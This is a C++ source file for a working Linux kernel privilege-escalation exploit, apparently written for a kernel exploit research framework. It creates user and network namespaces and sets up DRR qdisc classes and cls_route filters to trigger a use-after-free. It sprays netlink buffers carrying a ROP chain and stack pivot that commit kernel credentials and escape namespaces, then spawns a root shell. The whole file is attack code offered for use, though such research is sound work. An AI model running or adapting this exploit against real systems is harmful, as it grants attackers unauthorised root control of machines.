#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>

#include <linux/pkt_cls.h>

#include <netlink/cli/utils.h>
#include <netlink/cli/tc.h>
#include <netlink/cli/class.h>
#include <netlink/cli/cls.h>
#include <netlink/cli/qdisc.h>
#include <netlink/cli/addr.h>
#include <netlink/cli/link.h>
#include <netlink/cli/route.h>
#include <netlink/route/tc.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>
#include <linux/route.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>

#include <cassert>
#include <target/TargetDb.cpp>
#include <test/kpwn/Kpwn.cpp>
#include <util/incbin.cpp>
#include <util/syscalls.cpp>
#include <util/error.cpp>
#include <util/pwn_utils.cpp>
#include <payloads/Payload.cpp>
#include <util/HexDump.cpp>
#include <util/ArgumentParser.cpp>
#include <pivot/PivotFinder.cpp>
#include <pivot/StackPivot.cpp>

INCBIN(target_db, "target_db.kpwn");

void setup_namespaces()
{
        char *uid_map;
        char *gid_map;
        int ret, map;
        uid_t uid = getuid();
        uid_t gid = getgid();

        if (unshare(CLONE_NEWUSER|CLONE_NEWNET|CLONE_NEWNS)) {
                perror("unshare");
                exit(1);
        }

        map = open("/proc/self/setgroups", O_WRONLY);
        ret = write(map, "deny", 4);

        if (ret < 4) {
                perror("setgroups write");
                exit(1);
        }

        close(map);

        asprintf(&uid_map, "0 %d 1\n", uid);
        size_t len = strlen(uid_map);

        map = open("/proc/self/uid_map", O_WRONLY);
        
        ret = write(map, uid_map, len);

        if (ret < len) {
                perror("uid map write");
                exit(1);
        }
        close(map);

        asprintf(&gid_map, "0 %d 1\n", gid);
        map = open("/proc/self/gid_map", O_WRONLY);
        ret = write(map, gid_map, len);

        if (ret < len) {
                perror("gid map write");
                exit(1);
        }

        close(map);

        if (mount("tmpfs", "/tmp", "tmpfs", 0, NULL)) {
                perror("mount");
                exit(1);
        }
}

void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

/* Netlink code based on syzcaller generated snippets */
struct nlmsg {
        char* pos;
        int nesting;
        struct nlattr* nested[8];
        char buf[0x30000];
};

static void netlink_init2(struct nlmsg* nlmsg, int typ, int flags,
                         const void* data, int size)
{
        memset(nlmsg, 0, sizeof(*nlmsg));
        struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
        hdr->nlmsg_type = typ;
        hdr->nlmsg_flags = NLM_F_REQUEST | flags;
        memcpy(hdr + 1, data, size);
        nlmsg->pos = (char*)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_init(struct nlmsg* nlmsg, int typ, int flags,
                         const void* data, int size)
{
        memset(nlmsg, 0, sizeof(*nlmsg));
        struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
        hdr->nlmsg_type = typ;
        hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
        memcpy(hdr + 1, data, size);
        nlmsg->pos = (char*)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_attr(struct nlmsg* nlmsg, int typ, const void* data,
                         int size)
{
        struct nlattr* attr = (struct nlattr*)nlmsg->pos;
        printf("attr size: %d\n", size);

        attr->nla_len = sizeof(*attr) + size;

        if (nlmsg->pos - nlmsg->buf + attr->nla_len  > sizeof(nlmsg->buf))
                errx(1, "Netlink buffer overflow, increase size in struct nlmsg\n");

        attr->nla_type = typ;
        if (size > 0)
                memcpy(attr + 1, data, size);
        nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void netlink_nest(struct nlmsg* nlmsg, int typ)
{
        struct nlattr* attr = (struct nlattr*)nlmsg->pos;
        attr->nla_type = typ | NLA_F_NESTED;
        nlmsg->pos += sizeof(*attr);
        nlmsg->nested[nlmsg->nesting++] = attr;
}

static void netlink_done(struct nlmsg* nlmsg)
{
        struct nlattr* attr = nlmsg->nested[--nlmsg->nesting];

        if (nlmsg->pos - (char *) attr > 0xffff)
                errx(1, "Netlink attribute max size exceeded\n");

        attr->nla_len = nlmsg->pos - (char*)attr;
}

static int netlink_send_ext(struct nlmsg* nlmsg, int sock, uint16_t reply_type,
                            int* reply_len, bool dofail)
{
        if (nlmsg->pos > nlmsg->buf + sizeof(nlmsg->buf) || nlmsg->nesting)
                err(1, "netlink_send_ext error");

        struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
        hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;

        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;

        ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
                     (struct sockaddr*)&addr, sizeof(addr));

        if (n != (ssize_t)hdr->nlmsg_len) {
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }

        n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
        if (reply_len)
                *reply_len = 0;

        if (n < 0) {
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }
        if (n < (ssize_t)sizeof(struct nlmsghdr)) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }
        if (hdr->nlmsg_type == NLMSG_DONE)
                return 0;

        if (reply_len && hdr->nlmsg_type == reply_type) {
                *reply_len = n;
                return 0;
        }
        if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr))) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
               return -1;
        }
        if (hdr->nlmsg_type != NLMSG_ERROR) {
                errno = EINVAL;
                if (dofail)
                        err(1, "netlink_send_ext error");
                return -1;
        }

        errno = -((struct nlmsgerr*)(hdr + 1))->error;
        return -errno;
}

static int netlink_send(struct nlmsg* nlmsg, int sock)
{
        return netlink_send_ext(nlmsg, sock, 0, NULL, false);
}

/* End of syzkaller code */

static struct nlmsg nlmsg;
struct nl_cache *g_link_cache;
static struct nl_sock *g_nl_sock;

static void netlink_device_change(struct nlmsg* nlmsg, int sock,
                                  const char* name, bool up, const char* master,
                                  const void* mac, int macsize,
                                  const char* new_name)
{
        struct ifinfomsg hdr;
        memset(&hdr, 0, sizeof(hdr));

        if (up)
                hdr.ifi_flags = hdr.ifi_change = IFF_UP;

        hdr.ifi_index = if_nametoindex(name);

        netlink_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));

        if (new_name)
                netlink_attr(nlmsg, IFLA_IFNAME, new_name, strlen(new_name));

        if (master) {
                int ifindex = if_nametoindex(master);
                netlink_attr(nlmsg, IFLA_MASTER, &ifindex, sizeof(ifindex));
        }

        if (macsize)
                netlink_attr(nlmsg, IFLA_ADDRESS, mac, macsize);

        netlink_send(nlmsg, sock);
}

static void setup_network(char *link_name)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1)
                exit(1);

        netlink_device_change(&nlmsg, sock, "lo", true, 0, NULL, 0, link_name);

        close(sock);

        g_nl_sock = nl_cli_alloc_socket();
        nl_cli_connect(g_nl_sock, NETLINK_ROUTE);
        g_link_cache = nl_cli_link_alloc_cache(g_nl_sock);
}

void add_class_drr(uint32_t handle, uint32_t parent, uint32_t weight, uint32_t lmax)
{
        struct tcmsg hdr;
        struct nlmsg nlmsg;

        int flags = 0;

        flags = NLM_F_CREATE | NLM_F_EXCL;

        memset(&hdr, 0, sizeof(hdr));

        hdr.tcm_family = AF_UNSPEC;
        hdr.tcm_ifindex = 1;
        
        if (parent)
                hdr.tcm_parent = parent;
        else
                hdr.tcm_parent = TC_H_MAJ(handle);

        hdr.tcm_handle = handle;

        netlink_init(&nlmsg, RTM_NEWTCLASS, flags, &hdr, sizeof(hdr));

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1) {
                perror("netlink sock");
                exit(1);
        }

        netlink_nest(&nlmsg, TCA_OPTIONS);


        netlink_done(&nlmsg);
        int ret = netlink_send(&nlmsg, sock);

        if (ret)
                err(2, "drr create: %d", ret);
        close(sock);
}

void add_drr(uint32_t handle, uint32_t parent, int edit)
{
        struct tcmsg hdr;
        struct nlmsg nlmsg;

        int flags = 0;

        if (!edit)
                flags = NLM_F_CREATE | NLM_F_EXCL;

        memset(&hdr, 0, sizeof(hdr));

        hdr.tcm_family = AF_UNSPEC;
        hdr.tcm_ifindex = 1;
        
        if (parent)
                hdr.tcm_parent = parent;
        else
                hdr.tcm_parent = TC_H_ROOT;
        hdr.tcm_handle = handle;

        netlink_init(&nlmsg, RTM_NEWQDISC, flags, &hdr, sizeof(hdr));

        char kind[] = "drr";
        netlink_attr(&nlmsg, TCA_KIND, &kind, sizeof(kind));

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1) {
                perror("netlink sock");
                exit(1);
        }

        netlink_nest(&nlmsg, TCA_OPTIONS);


        netlink_done(&nlmsg);
        int ret = netlink_send(&nlmsg, sock);

        if (ret)
                err(2, "drr create: %d", ret);
        close(sock);
}

void delete_class(uint32_t handle)
{
        struct tcmsg hdr;
        struct nlmsg nlmsg;

        int flags = 0;

        memset(&hdr, 0, sizeof(hdr));

        hdr.tcm_family = AF_UNSPEC;
        hdr.tcm_ifindex = 1;
        hdr.tcm_parent = TC_H_ROOT;
        hdr.tcm_handle = handle;

        netlink_init(&nlmsg, RTM_DELTCLASS, flags, &hdr, sizeof(hdr));


        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1) {
                perror("netlink sock");
                exit(1);
        }

        int err = netlink_send(&nlmsg, sock);

        close(sock);
}

void add_route_filter(uint32_t parent, uint32_t chain, uint32_t handle, uint32_t target, int edit)
{
        struct tcmsg hdr;
        struct nlmsg nlmsg;
        int prio = 1;

        int flags = 0;

        if (!edit)
                flags = NLM_F_CREATE | NLM_F_EXCL;

        memset(&hdr, 0, sizeof(hdr));

        hdr.tcm_family = AF_UNSPEC;
        hdr.tcm_ifindex = 1;
        hdr.tcm_parent = parent;

// cls_route handles contain following parameters encoded in uint32_t: source realm, source interface and destination realm
// This means we only filter by destination realm, any source will match:
        hdr.tcm_handle = (handle & 0xff) | (0xffff << 16);

        hdr.tcm_info = TC_H_MAKE(prio << 16, htons(ETH_P_ALL));

        netlink_init(&nlmsg, RTM_NEWTFILTER, flags, &hdr, sizeof(hdr));

        netlink_attr(&nlmsg, TCA_CHAIN, &chain, sizeof(chain));
        char kind[] = "route";
        netlink_attr(&nlmsg, TCA_KIND, &kind, sizeof(kind));

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
        if (sock == -1) {
                perror("netlink sock");
                exit(1);
        }

        netlink_nest(&nlmsg, TCA_OPTIONS);

        uint32_t to = handle;

// Editing an existing filter without changing match params throws -EEXIST
        if (edit)
                to = 0x10;

        netlink_attr(&nlmsg, TCA_ROUTE4_TO, &to, sizeof(to));

        if (target) {
                uint32_t class_id = target;
                netlink_attr(&nlmsg, TCA_ROUTE4_CLASSID, &class_id, sizeof(class_id));
        }

        netlink_done(&nlmsg);
        int err = netlink_send(&nlmsg, sock);

        close(sock);
}

void add_route()
{
        struct rtnl_route *route;
        struct rtnl_nexthop *nh;
        int ret;

        route = nl_cli_route_alloc();

        nl_cli_route_parse_dst(route, const_cast<char*>("127.0.0.2/32"));

        if (!(nh = rtnl_route_nh_alloc()))
                nl_cli_fatal(ENOMEM, "Out of memory");

        rtnl_route_nh_set_ifindex(nh, rtnl_link_name2i(g_link_cache, "lo"));
        rtnl_route_nh_set_realms(nh, 2);

        rtnl_route_add_nexthop(route, nh);

        if ((ret = rtnl_route_add(g_nl_sock, route, 0)) < 0)
                err(1, "Unable to add route: %s", nl_geterror(ret));

}

void trigger_classify()
{
        int ret, sock;
        struct sockaddr_in client_addr;

        sock = socket(AF_INET, SOCK_DGRAM, 0);

        client_addr.sin_family = AF_INET;
        client_addr.sin_addr.s_addr = inet_addr("127.0.0.2");
        client_addr.sin_port = htons(2000);

        struct msghdr hdr;
        memset(&hdr, 0, sizeof(hdr));

        struct iovec  iov[1];
        iov[0].iov_base = const_cast<char*>("A");
        iov[0].iov_len = 1;

        hdr.msg_iov = iov;
        hdr.msg_iovlen = 1;
        hdr.msg_name = &client_addr;
        hdr.msg_namelen = sizeof(client_addr);

        sendmsg(sock, &hdr, 0);

}

void prepare_netlink_listener(unsigned int port_id)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id;
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)))
                err(1, "bind netlink fail\n");
}

void alloc_netlink(size_t len, unsigned char *buf)
{
        static unsigned int port_id = 0x6666;

        prepare_netlink_listener(port_id);

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id++;

        ssize_t n = sendto(sock, buf, len - 0x140, MSG_DONTWAIT, (struct sockaddr*)&addr, sizeof(addr));

        if (n < 0)
                err(1, "sendto netlink\n");
}

int main(int argc, char **argv)
{
	long kernel_base;

        TargetDb kpwn_db(target_db, target_db_size);
        auto target = kpwn_db.AutoDetectTarget();
        printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());

        /* Get kernel base from command line or prefetch side channel */
        if (argc > 1) {
        	kernel_base = strtoul(argv[1], NULL, 16);
        	printf("[*] Using provided kernel base: %p\n", kernel_base);
        } else {
        	printf("[*] Kernel base is not provided!!!\n");
        	exit(EXIT_FAILURE);
        }

	printf("Kernel base: 0x%lx\n", kernel_base);
        
	check_kaslr_base(kernel_base);

        setbuf(stdout, NULL);
	
        setup_namespaces();
        set_cpu(0);

	printf("[+] ROP chain:\n");
        RopChain rop(target, kernel_base);
        rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
        rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});
        rop.AddRopAction(RopActionId::TELEFORK, {1000000});
        HexDump::Print(rop.GetData());

        Payload payload(512);
        payload.Reserve(0, 8);

        PivotFinder pivot_finder(target.pivots, {Register::RAX, Register::RSI}, payload);
        auto rop_pivot = pivot_finder.PivotToRop(rop);
        rop_pivot.PrintDebugInfo();

        // Put PushIndirect at the very beginning of Payload
        payload.Release(0, 8);
	payload.Set(0, kernel_base + rop_pivot.pivot.GetGadgetOffset());

        printf("[+] Payload:\n");
        HexDump::Print(payload.GetUsedData());

        setup_network(NULL);

        add_drr(0x10000, 0, 0);
        add_class_drr(0x10001, 0x10000, 0x1, 0);
        add_class_drr(0x10002, 0x10000, 0x1, 0);

        add_route_filter(0x10000, 0, 1, 0x10001, 0);
        add_route_filter(0x10000, 0, 2, 0x10001, 0);

        add_route_filter(0x10000, 0, 1, 0x10002, 1);

        add_route();

        delete_class(0x10001);

// @sleep(kernel_func="qdisc_free_cb",
//      desc="wait for RCU to trigger Qdisc object removal")
        sleep(1);

        //prepare_fake_qdisc(g_mmapped_buf);

        for (int i = 0; i < 64; i++)
        {
                alloc_netlink(512, payload.GetUsedData().data());
        }

        trigger_classify();

	printf("[*] Launching shell\n");
        system("/bin/sh");
	
        return 0;
}
